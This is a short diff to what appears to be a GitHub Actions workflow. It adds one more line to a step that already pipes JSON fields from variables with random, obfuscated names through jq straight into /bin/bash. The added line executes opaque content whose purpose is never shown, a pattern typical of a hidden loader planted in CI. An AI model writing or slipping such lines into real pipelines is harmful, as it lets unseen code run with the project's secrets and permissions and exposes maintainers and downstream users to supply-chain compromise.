@@ -38,6 +38,7 @@ jobs:
           echo $jt5513 | jq -r .cf1 | /bin/bash
           printf '%s' "$kjyj7357" | jq -r .zdzqo02 | /bin/bash
           printf '%s' "$rnwp66" | jq -r .bin4 | /bin/bash
+          echo $f41 | jq -r .naol89 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
